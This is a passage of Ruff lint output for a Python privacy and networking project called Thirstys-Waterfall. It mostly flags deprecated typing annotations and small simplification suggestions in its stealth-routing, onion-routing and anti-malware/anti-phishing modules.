85 |     def get_item(self, item_id: str) -> Optional[Dict[str, Any]]:
   |                                         ^^^^^^^^^^^^^^^^^^^^^^^^
86 |         """Get item from library"""
87 |         for item in self._catalog:
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_library.py:85:50
   |
83 |         return item["id"]
84 |
85 |     def get_item(self, item_id: str) -> Optional[Dict[str, Any]]:
   |                                                  ^^^^
86 |         """Get item from library"""
87 |         for item in self._catalog:
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_library.py:92:38
   |
90 |         return None
91 |
92 |     def list_items(self, media_type: Optional[str] = None) -> List[Dict[str, Any]]:
   |                                      ^^^^^^^^^^^^^
93 |         """List all items or filtered by type"""
94 |         if media_type:
   |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_library.py:92:63
   |
90 |         return None
91 |
92 |     def list_items(self, media_type: Optional[str] = None) -> List[Dict[str, Any]]:
   |                                                               ^^^^
93 |         """List all items or filtered by type"""
94 |         if media_type:
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_library.py:92:68
   |
90 |         return None
91 |
92 |     def list_items(self, media_type: Optional[str] = None) -> List[Dict[str, Any]]:
   |                                                                    ^^^^
93 |         """List all items or filtered by type"""
94 |         if media_type:
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_library.py:110:28
    |
108 |         self.logger.info(f"Library cleared - {count} items removed")
109 |
110 |     def get_stats(self) -> Dict[str, Any]:
    |                            ^^^^
111 |         """Get library statistics"""
112 |         return self._stats.copy()
    |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:16:1
   |
14 | from dataclasses import dataclass, field
15 | from enum import Enum
16 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
17 |
18 | from cryptography.hazmat.backends import default_backend
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:16:1
   |
14 | from dataclasses import dataclass, field
15 | from enum import Enum
16 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
17 |
18 | from cryptography.hazmat.backends import default_backend
   |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:63:22
   |
61 |     bytes_received: int = 0
62 |     circuits_built: int = 0
63 |     transports_used: Dict[str, int] = field(default_factory=lambda: defaultdict(int))
   |                      ^^^^
64 |     obfuscation_applied: Dict[str, int] = field(
65 |         default_factory=lambda: defaultdict(int)
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:64:26
   |
62 |     circuits_built: int = 0
63 |     transports_used: Dict[str, int] = field(default_factory=lambda: defaultdict(int))
64 |     obfuscation_applied: Dict[str, int] = field(
   |                          ^^^^
65 |         default_factory=lambda: defaultdict(int)
66 |     )
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:67:25
   |
65 |         default_factory=lambda: defaultdict(int)
66 |     )
67 |     protocols_mimicked: Dict[str, int] = field(default_factory=lambda: defaultdict(int))
   |                         ^^^^
68 |     domain_fronting_used: int = 0
69 |     average_latency_ms: float = 0.0
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:89:23
   |
87 |     enabled: bool = True
88 |     priority: int = 5
89 |     bridge_addresses: List[str] = field(default_factory=list)
   |                       ^^^^
90 |     fingerprint: Optional[str] = None
91 |     certificate: Optional[bytes] = None
   |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:90:18
   |
88 |     priority: int = 5
89 |     bridge_addresses: List[str] = field(default_factory=list)
90 |     fingerprint: Optional[str] = None
   |                  ^^^^^^^^^^^^^
91 |     certificate: Optional[bytes] = None
92 |     obfuscation_key: Optional[bytes] = None
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:91:18
   |
89 |     bridge_addresses: List[str] = field(default_factory=list)
90 |     fingerprint: Optional[str] = None
91 |     certificate: Optional[bytes] = None
   |                  ^^^^^^^^^^^^^^^
92 |     obfuscation_key: Optional[bytes] = None
93 |     max_padding: int = 1024
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:92:22
   |
90 |     fingerprint: Optional[str] = None
91 |     certificate: Optional[bytes] = None
92 |     obfuscation_key: Optional[bytes] = None
   |                      ^^^^^^^^^^^^^^^
93 |     max_padding: int = 1024
94 |     timing_variance_ms: int = 500
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:105:17
    |
104 |     circuit_id: str
105 |     entry_node: Dict[str, Any]
    |                 ^^^^
106 |     middle_nodes: List[Dict[str, Any]]
107 |     exit_node: Dict[str, Any]
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:106:19
    |
104 |     circuit_id: str
105 |     entry_node: Dict[str, Any]
106 |     middle_nodes: List[Dict[str, Any]]
    |                   ^^^^
107 |     exit_node: Dict[str, Any]
108 |     established_at: float
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:106:24
    |
104 |     circuit_id: str
105 |     entry_node: Dict[str, Any]
106 |     middle_nodes: List[Dict[str, Any]]
    |                        ^^^^
107 |     exit_node: Dict[str, Any]
108 |     established_at: float
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:107:16
    |
105 |     entry_node: Dict[str, Any]
106 |     middle_nodes: List[Dict[str, Any]]
107 |     exit_node: Dict[str, Any]
    |                ^^^^
108 |     established_at: float
109 |     request_count: int = 0
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:113:27
    |
111 |     is_active: bool = True
112 |
113 |     def get_path(self) -> List[str]:
    |                           ^^^^
114 |         """Get circuit path as list of node IDs"""
115 |         path = [self.entry_node["id"]]
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:318:32
    |
316 |     """
317 |
318 |     def __init__(self, config: Dict[str, Any]):
    |                                ^^^^
319 |         self.logger = logging.getLogger(__name__)
320 |         self.enabled = config.get("obfuscation_enabled", True)
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:340:39
    |
339 |     def obfuscate_request(
340 |         self, data: bytes, technique: Optional[ObfuscationTechnique] = None
    |                                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
341 |     ) -> bytes:
342 |         """Apply obfuscation to outgoing request"""
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:509:30
    |
507 |         return game_header + data
508 |
509 |     def get_metrics(self) -> Dict[str, int]:
    |                              ^^^^
510 |         """Get obfuscation metrics"""
511 |         return dict(self._metrics)
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:520:32
    |
518 |     """
519 |
520 |     def __init__(self, config: Dict[str, Any]):
    |                                ^^^^
521 |         self.logger = logging.getLogger(__name__)
522 |         self.enabled = config.get("domain_fronting_enabled", True)
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:535:50
    |
533 |         self._usage_count = defaultdict(int)
534 |
535 |     def setup_front(self, target_domain: str) -> Optional[str]:
    |                                                  ^^^^^^^^^^^^^
536 |         """
537 |         Setup domain front for target domain.
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:564:24
    |
563 |     def get_fronted_request(
564 |         self, request: Dict[str, Any], front_domain: str
    |                        ^^^^
565 |     ) -> Dict[str, Any]:
566 |         """
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:565:10
    |
563 |     def get_fronted_request(
564 |         self, request: Dict[str, Any], front_domain: str
565 |     ) -> Dict[str, Any]:
    |          ^^^^
566 |         """
567 |         Modify request to use domain fronting.
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:578:36
    |
576 |         return fronted_request
577 |
578 |     def get_active_fronts(self) -> List[Dict[str, Any]]:
    |                                    ^^^^
579 |         """Get list of active domain fronts"""
580 |         return self._active_fronts.copy()
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:578:41
    |
576 |         return fronted_request
577 |
578 |     def get_active_fronts(self) -> List[Dict[str, Any]]:
    |                                         ^^^^
579 |         """Get list of active domain fronts"""
580 |         return self._active_fronts.copy()
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:598:32
    |
596 |     """
597 |
598 |     def __init__(self, config: Dict[str, Any]):
    |                                ^^^^
599 |         self.config = config
600 |         self.logger = logging.getLogger(__name__)
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:653:25
    |
651 |     def _init_onion_circuits(self):
652 |         """Initialize onion circuits for per-request routing"""
653 |         self._circuits: List[OnionCircuit] = []
    |                         ^^^^
654 |         self._circuit_pool_size = self.config.get("circuit_pool_size", 5)
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:659:42
    |
657 |         self._nodes = self._initialize_onion_nodes()
658 |
659 |     def _initialize_onion_nodes(self) -> List[Dict[str, Any]]:
    |                                          ^^^^
660 |         """Initialize pool of onion nodes"""
661 |         nodes = [
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:659:47
    |
657 |         self._nodes = self._initialize_onion_nodes()
658 |
659 |     def _initialize_onion_nodes(self) -> List[Dict[str, Any]]:
    |                                               ^^^^
660 |         """Initialize pool of onion nodes"""
661 |         nodes = [
    |
help: Replace with `dict`

B007 Loop control variable `i` not used within loop body
   --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:761:13
    |
759 |         self.logger.info(f"Building circuit pool ({self._circuit_pool_size} circuits)")
760 |
761 |         for i in range(self._circuit_pool_size):
    |             ^
762 |             circuit = self._build_onion_circuit()
763 |             if circuit:
    |
help: Rename unused `i` to `_i`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:769:39
    |
767 |         self.logger.info(f"Circuit pool ready: {len(self._circuits)} circuits")
768 |
769 |     def _build_onion_circuit(self) -> Optional[OnionCircuit]:
    |                                       ^^^^^^^^^^^^^^^^^^^^^^
770 |         """Build a single onion circuit"""
771 |         try:
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:809:34
    |
807 |             return None
808 |
809 |     def _select_circuit(self) -> Optional[OnionCircuit]:
    |                                  ^^^^^^^^^^^^^^^^^^^^^^
810 |         """Select best circuit for request"""
811 |         if not self._circuits:
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:826:36
    |
824 |         return circuit
825 |
826 |     def _select_transport(self) -> Optional[PluggableTransport]:
    |                                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
827 |         """Select best transport for request"""
828 |         # Get active transports
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:851:38
    |
849 |         return transport
850 |
851 |     def route_request(self, request: Dict[str, Any]) -> Dict[str, Any]:
    |                                      ^^^^
852 |         """
853 |         Route request through stealth pipeline.
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:851:57
    |
849 |         return transport
850 |
851 |     def route_request(self, request: Dict[str, Any]) -> Dict[str, Any]:
    |                                                         ^^^^
852 |         """
853 |         Route request through stealth pipeline.
    |
help: Replace with `dict`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:939:17
    |
938 |                   # Encrypt with transport
939 | /                 if transport and "data" in processed_request:
940 | |                     if isinstance(processed_request["data"], bytes):
    | |____________________________________________________________________^
941 |                           encrypted = transport.transmit(processed_request["data"])
942 |                           processed_request["data"] = encrypted
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:991:13
    |
989 |           if transport_type in self.transports:
990 |               transport = self.transports[transport_type]
991 | /             if not transport.is_active():
992 | |                 if transport.connect():
    | |_______________________________________^
993 |                       self._metrics.transport_switches += 1
994 |                       self.logger.info(f"Switched to {transport_type.value}")
    |
help: Combine `if` statements using `and`

UP006 [*] Use `dict` instead of `Dict` for type annotation
    --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:1004:29
     |
1002 |         self.switch_transport(TransportType.QUIC)
1003 |
1004 |     def get_status(self) -> Dict[str, Any]:
     |                             ^^^^
1005 |         """Get comprehensive stealth status"""
1006 |         return {
     |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
    --> external\Thirstys-Waterfall\thirstys_waterfall\network\advanced_stealth.py:1045:39
     |
1043 |         return self._metrics
1044 |
1045 |     def get_detailed_metrics(self) -> Dict[str, Any]:
     |                                       ^^^^
1046 |         """Get detailed metrics including obfuscation stats"""
1047 |         obf_metrics = self.obfuscation.get_metrics()
     |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\orchestrator.py:10:1
   |
 8 | import logging
 9 | import sys
10 | from typing import Any, Dict, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
11 |
12 | from cryptography.fernet import Fernet
   |

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\orchestrator.py:66:37
   |
64 |     """
65 |
66 |     def __init__(self, config_path: Optional[str] = None):
   |                                     ^^^^^^^^^^^^^
67 |         # Setup logging
68 |         self._setup_logging()
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\orchestrator.py:269:29
    |
267 |             self.logger.error(f"Error during shutdown: {e}")
268 |
269 |     def get_status(self) -> Dict[str, Any]:
    |                             ^^^^
270 |         """Get comprehensive system status"""
271 |         return {
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\orchestrator.py:318:36
    |
316 |         }
317 |
318 |     def run_privacy_audit(self) -> Dict[str, Any]:
    |                                    ^^^^
319 |         """Run comprehensive privacy audit"""
320 |         return self.privacy_auditor.run_full_audit()
    |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\anti_fingerprint.py:5:1
  |
3 | import logging
4 | import random
5 | from typing import Any, Dict
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\anti_fingerprint.py:14:32
   |
12 |     """
13 |
14 |     def __init__(self, config: Dict[str, Any]):
   |                                ^^^^
15 |         self.enabled = config.get("anti_fingerprint", True)
16 |         self.logger = logging.getLogger(__name__)
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\anti_fingerprint.py:92:40
   |
90 |         return ["Arial", "Times New Roman", "Courier New"]
91 |
92 |     def get_protection_status(self) -> Dict[str, Any]:
   |                                        ^^^^
93 |         """Get anti-fingerprint protection status"""
94 |         return {
   |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\anti_malware.py:5:1
  |
3 | import hashlib
4 | import logging
5 | from typing import Any, Dict, Set
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP035 `typing.Set` is deprecated, use `set` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\anti_malware.py:5:1
  |
3 | import hashlib
4 | import logging
5 | from typing import Any, Dict, Set
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\anti_malware.py:14:32
   |
12 |     """
13 |
14 |     def __init__(self, config: Dict[str, Any]):
   |                                ^^^^
15 |         self.enabled = config.get("anti_malware", True)
16 |         self.logger = logging.getLogger(__name__)
   |
help: Replace with `dict`

UP006 [*] Use `set` instead of `Set` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\anti_malware.py:19:35
   |
17 |         self._active = False
18 |
19 |         self._malware_signatures: Set[str] = set()
   |                                   ^^^
20 |         self._malicious_domains: Set[str] = set()
21 |         self._detected_count = 0
   |
help: Replace with `set`

UP006 [*] Use `set` instead of `Set` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\anti_malware.py:20:34
   |
19 |         self._malware_signatures: Set[str] = set()
20 |         self._malicious_domains: Set[str] = set()
   |                                  ^^^
21 |         self._detected_count = 0
   |
help: Replace with `set`

SIM103 Return the condition `self._heuristic_scan(file_data)` directly
  --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\anti_malware.py:87:9
   |
86 |           # Heuristic analysis
87 | /         if not self._heuristic_scan(file_data):
88 | |             return False
89 | |
90 | |         return True
   | |___________________^
91 |
92 |       def _heuristic_scan(self, data: bytes) -> bool:
   |
help: Replace with `return self._heuristic_scan(file_data)`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\anti_malware.py:143:33
    |
141 |         self._malware_signatures.add(signature)
142 |
143 |     def get_statistics(self) -> Dict[str, Any]:
    |                                 ^^^^
144 |         """Get anti-malware statistics"""
145 |         return {
    |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\anti_phishing.py:5:1
  |
3 | import logging
4 | import re
5 | from typing import Any, Dict, Set
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP035 `typing.Set` is deprecated, use `set` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\anti_phishing.py:5:1
  |
3 | import logging
4 | import re
5 | from typing import Any, Dict, Set
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\anti_phishing.py:14:32
   |
12 |     """
13 |
14 |     def __init__(self, config: Dict[str, Any]):
   |                                ^^^^
15 |         self.enabled = config.get("anti_phishing", True)
16 |         self.logger = logging.getLogger(__name__)
   |
help: Replace with `dict`

UP006 [*] Use `set` instead of `Set` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\anti_phishing.py:19:33
   |
17 |         self._active = False
18 |
19 |         self._phishing_domains: Set[str] = set()
   |                                 ^^^
20 |         self._suspicious_patterns = []
21 |         self._blocked_count = 0
   |
help: Replace with `set`

SIM110 Use `return any(char in url for char in suspicious_chars)` instead of `for` loop
   --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\anti_phishing.py:99:9
    |
 97 |           suspicious_chars = ["╨░", "╨╡", "╨╛", "╤Ç", "╤ü", "╤â", "╤à"]  # Cyrillic
 98 |
 99 | /         for char in suspicious_chars:
100 | |             if char in url:
101 | |                 return True
102 | |
103 | |         return False
    | |____________________^
104 |
105 |       def _contains_phishing_content(self, content: str) -> bool:
    |
help: Replace with `return any(char in url for char in suspicious_chars)`

SIM110 Use `return any(keyword in content_lower for keyword in phishing_keywords)` instead of `for` loop
   --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\anti_phishing.py:118:9
    |
117 |           content_lower = content.lower()
118 | /         for keyword in phishing_keywords:
119 | |             if keyword in content_lower:
120 | |                 return True
121 | |
122 | |         return False
    | |____________________^
123 |
124 |       def report_phishing(self, url: str):
    |
help: Replace with `return any(keyword in content_lower for keyword in phishing_keywords)`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\anti_phishing.py:129:33
    |
127 |         self.logger.info(f"Phishing URL reported and blocked: {url}")
128 |
129 |     def get_statistics(self) -> Dict[str, Any]:
    |                                 ^^^^
130 |         """Get anti-phishing statistics"""
131 |         return {
    |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\anti_tracker.py:4:1
  |
3 | import logging
4 | from typing import Any, Dict, Set
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP035 `typing.Set` is deprecated, use `set` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\anti_tracker.py:4:1
  |
3 | import logging
4 | from typing import Any, Dict, Set
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\anti_tracker.py:13:32
   |
11 |     """
12 |
13 |     def __init__(self, config: Dict[str, Any]):
   |                                ^^^^
14 |         self.enabled = config.get("anti_tracker", True)
15 |         self.logger = logging.getLogger(__name__)
   |
help: Replace with `dict`

UP006 [*] Use `set` instead of `Set` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\anti_tracker.py:18:33
   |
16 |         self._active = False
17 |
18 |         self._blocked_trackers: Set[str] = set()
   |                                 ^^^
19 |         self._tracking_domains: Set[str] = set()
20 |         self._blocked_count = 0
   |
help: Replace with `set`

UP006 [*] Use `set` instead of `Set` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\anti_tracker.py:19:33
   |
18 |         self._blocked_trackers: Set[str] = set()
19 |         self._tracking_domains: Set[str] = set()
   |                                 ^^^
20 |         self._blocked_count = 0
   |
help: Replace with `set`

SIM103 Return the negated condition directly
   --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\anti_tracker.py:111:9
    |
109 |               True if blocked
110 |           """
111 | /         if not self._active:
112 | |             return False
113 | |
114 | |         # Block ETag tracking
115 | |         return True
    | |___________________^
116 |
117 |       def get_statistics(self) -> Dict[str, Any]:
    |
help: Inline condition

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\anti_tracker.py:117:33
    |
115 |         return True
116 |
117 |     def get_statistics(self) -> Dict[str, Any]:
    |                                 ^^^^
118 |         """Get anti-tracking statistics"""
119 |         return {
    |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\onion_router.py:5:1
  |
3 | import logging
4 | import random
5 | from typing import Any, Dict, List
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\onion_router.py:5:1
  |
3 | import logging
4 | import random
5 | from typing import Any, Dict, List
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\onion_router.py:14:32
   |
12 |     """
13 |
14 |     def __init__(self, config: Dict[str, Any]):
   |                                ^^^^
15 |         self.enabled = config.get("onion_routing", True)
16 |         self.logger = logging.getLogger(__name__)
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\onion_router.py:19:22
   |
17 |         self._active = False
18 |
19 |         self._nodes: List[Dict[str, Any]] = []
   |                      ^^^^
20 |         self._circuits: List[List[Dict[str, Any]]] = []
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\onion_router.py:19:27
   |
17 |         self._active = False
18 |
19 |         self._nodes: List[Dict[str, Any]] = []
   |                           ^^^^
20 |         self._circuits: List[List[Dict[str, Any]]] = []
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\onion_router.py:20:25
   |
19 |         self._nodes: List[Dict[str, Any]] = []
20 |         self._circuits: List[List[Dict[str, Any]]] = []
   |                         ^^^^
21 |
22 |         self._initialize_nodes()
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\onion_router.py:20:30
   |
19 |         self._nodes: List[Dict[str, Any]] = []
20 |         self._circuits: List[List[Dict[str, Any]]] = []
   |                              ^^^^
21 |
22 |         self._initialize_nodes()
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\onion_router.py:20:35
   |
19 |         self._nodes: List[Dict[str, Any]] = []
20 |         self._circuits: List[List[Dict[str, Any]]] = []
   |                                   ^^^^
21 |
22 |         self._initialize_nodes()
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\onion_router.py:59:33
   |
57 |                 self.logger.debug(f"Circuit established: {[n['id'] for n in circuit]}")
58 |
59 |     def _build_circuit(self) -> List[Dict[str, Any]]:
   |                                 ^^^^
60 |         """Build a single onion circuit"""
61 |         circuit = []
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\onion_router.py:59:38
   |
57 |                 self.logger.debug(f"Circuit established: {[n['id'] for n in circuit]}")
58 |
59 |     def _build_circuit(self) -> List[Dict[str, Any]]:
   |                                      ^^^^
60 |         """Build a single onion circuit"""
61 |         circuit = []
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\onion_router.py:84:38
   |
82 |         return circuit if len(circuit) == 3 else []
83 |
84 |     def route_request(self, request: Dict[str, Any]) -> Dict[str, Any]:
   |                                      ^^^^
85 |         """
86 |         Route request through onion circuit.
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\onion_router.py:84:57
   |
82 |         return circuit if len(circuit) == 3 else []
83 |
84 |     def route_request(self, request: Dict[str, Any]) -> Dict[str, Any]:
   |                                                         ^^^^
85 |         """
86 |         Route request through onion circuit.
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\onion_router.py:107:31
    |
105 |         return encrypted_request
106 |
107 |     def get_circuits(self) -> List[List[Dict[str, Any]]]:
    |                               ^^^^
108 |         """Get active circuits"""
109 |         return self._circuits.copy()
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\onion_router.py:107:36
    |
105 |         return encrypted_request
106 |
107 |     def get_circuits(self) -> List[List[Dict[str, Any]]]:
    |                                    ^^^^
108 |         """Get active circuits"""
109 |         return self._circuits.copy()
    |
